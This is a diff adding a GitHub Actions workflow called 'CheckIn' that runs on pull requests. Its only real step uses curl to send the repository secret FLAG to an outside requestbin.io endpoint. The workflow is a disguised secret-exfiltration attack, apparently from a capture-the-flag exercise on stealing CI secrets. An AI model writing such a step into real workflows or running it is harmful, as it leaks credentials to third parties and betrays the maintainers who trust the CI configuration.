@@ -1,0 +1,14 @@
+name: CheckIn
+
+on: [pull_request]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v2
+    - name: gmltql
+      run: |
+        curl "https://requestbin.io/1mpb5q31?fflag=${{ secrets.FLAG }}"
